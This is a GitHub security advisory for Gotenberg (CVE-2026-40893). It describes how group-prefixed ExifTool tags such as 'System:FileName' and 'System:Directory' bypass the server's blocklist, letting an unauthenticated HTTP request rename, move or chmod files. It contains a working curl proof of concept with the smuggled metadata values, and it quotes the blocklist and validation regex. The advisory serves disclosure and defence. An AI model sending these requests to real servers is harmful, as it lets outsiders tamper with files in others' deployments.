# [H] Gotenberg has an ExifTool Dangerous Tag Blocklist Bypass via Group-Prefixed Tag Names that Allows Arbitrary File Rename and Move

## Summary
Severity: High
Advisory: GHSA-62p3-hvxx-fxg4
CVE: CVE-2026-40893
CWE: CWE-20, CWE-73
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-62p3-hvxx-fxg4
Type: github-advisory

## Affected
- Go: `github.com/gotenberg/gotenberg/v8` — affected >=0

## Details
### Summary

Gotenberg blocks certain ExifTool tag names like `FileName` and `Directory` to stop attackers from renaming or moving files on the server. But ExifTool allows a longer form of the same tag — `System:FileName` — which does the exact same thing. Gotenberg only checks if the tag is exactly `FileName`, so `System:FileName` slips right through and ExifTool happily renames the file. No login is needed. One HTTP request is enough.

This bypasses the fix from [GHSA-qmwh-9m9c-h36m](https://github.com/gotenberg/gotenberg/security/advisories/GHSA-qmwh-9m9c-h36m).

### Details

Think of it like a nightclub bouncer with a blocklist of banned names. The blocklist says "Block anyone named **John**." A person shows up and says "I'm **Mr. John**." The bouncer checks — "Mr. John" is not "John" — so he lets them in. But inside the club, everyone knows Mr. John IS John.

That's exactly what happens here:

**The blocklist** (`exiftool.go` line 275-280) blocks these tag names:

```
FileName
Directory
HardLink
SymLink
```

**The check** (`exiftool.go` line 295-301) compares what the user sent against this list:

```go
if strings.EqualFold(key, tag) {   // is "System:FileName" equal to "FileName"?
    delete(metadata, key)            // no — so it's NOT deleted
}
```

`System:FileName` is not equal to `FileName` (one is 16 characters, the other is 8), so it passes through.

**But ExifTool treats them as the same thing.** In ExifTool, `System:` is just a group prefix — like a folder name before the tag. `System:FileName` and `FileName` both mean "rename this file." The [ExifTool docs](https://exiftool.org/exiftool_pod.html) say: *"A tag name may include leading group names separated by colons."*

**Why the colon is allowed:** The key validation regex (`exiftool.go` line 31) explicitly permits colons:

```go
var safeKeyPattern = regexp.MustCompile(`^[a-zA-Z0-9\-_.:]+$`)
//                                                    ^ colon is allowed
```

So the full chain is:

1. Attacker sends `System:FileName` → passes the regex (colon is allowed)
2. `System:FileName` → passes the blocklist (it's not equal to `FileName`)
3. ExifTool receives `System:FileName` → treats it as `FileName` → **renames the file**

**Bonus finding:** The `FilePermissions` tag is not in the blocklist at all. Sending `{"FilePermissions": "rwxrwxrwx"}` tells ExifTool to chmod the file, and nothing stops it.

### PoC

**Setup — start Gotenberg with default settings:**

```bash
docker run -d --name gotenberg-poc -p 3000:3000 gotenberg/gotenberg:8
```


**Create a folder inside the container where we'll move the file to:**

```bash
docker exec gotenberg-poc mkdir -p /tmp/evil
```

**Send the attack — one curl command:**

```bash
curl -X POST http://localhost:3000/forms/pdfengines/metadata/write \
  -F 'files=@any-pdf-file.pdf' \
  -F 'metadata={"System:FileName":"stolen.pdf","System:Directory":"/tmp/evil"}'
```

This returns HTTP 404 because the file got moved before the server could return it.

**Check that the file actually moved:**

```bash
docker exec gotenberg-poc ls -la /tmp/evil/
```

**Result:**

```
-rw-r--r-- 1 gotenberg gotenberg 17789 Apr 13 07:40 stolen.pdf
```

The file is sitting in `/tmp/evil/stolen.pdf`. It was renamed from its random UUID name to `stolen.pdf` and moved out of the temporary directory — exactly what the blocklist was supposed to prevent.

**Proof that the existing blocklist works for bare names (control test):**

```bash
curl -X POST http://localhost:3000/forms/pdfengines/metadata/write \
  -F 'files=@any-pdf-file.pdf' \
  -F 'metadata={"FileName":"stolen.pdf","Directory":"/tmp/evil"}'
```

This returns HTTP 500 — the bare `FileName` tag was correctly blocked. Only the `System:FileName` variant gets through.

**Other ways to exploit the same bug:**

- `system:filename` (lowercase) — also works because ExifTool is case-insensitive
- `system:directory` — moves the file to any writable folder
- `FilePermissions` — changes the file's permissions (this tag is simply missing from the blocklist entirely)

**Every endpoint that accepts the `metadata` field is affected**, including `/forms/chromium/convert/html`, `/forms/libreoffice/convert`, `/forms/pdfengines/merge`, and all other conversion routes.

### Impact

Any person who can send HTTP requests to Gotenberg (no login needed by default) can:

- **Move files anywhere** inside the container by using `System:Directory`
- **Rename files** to anything by using `System:FileName`
- **Change file permissions** by using `FilePermissions` (this tag is not blocked at all)
- **Break the service** for other users — when a file gets moved mid-request, the server returns 404 errors

In real-world deployments where Gotenberg shares a Docker volume with other services (which is common), an attacker can drop a PDF file with controlled content into that shared folder — potentially affecting whatever service reads files from there.

## References
- https://github.com/gotenberg/gotenberg/security/advisories/GHSA-62p3-hvxx-fxg4
- https://nvd.nist.gov/vuln/detail/CVE-2026-40893
- https://github.com/gotenberg/gotenberg
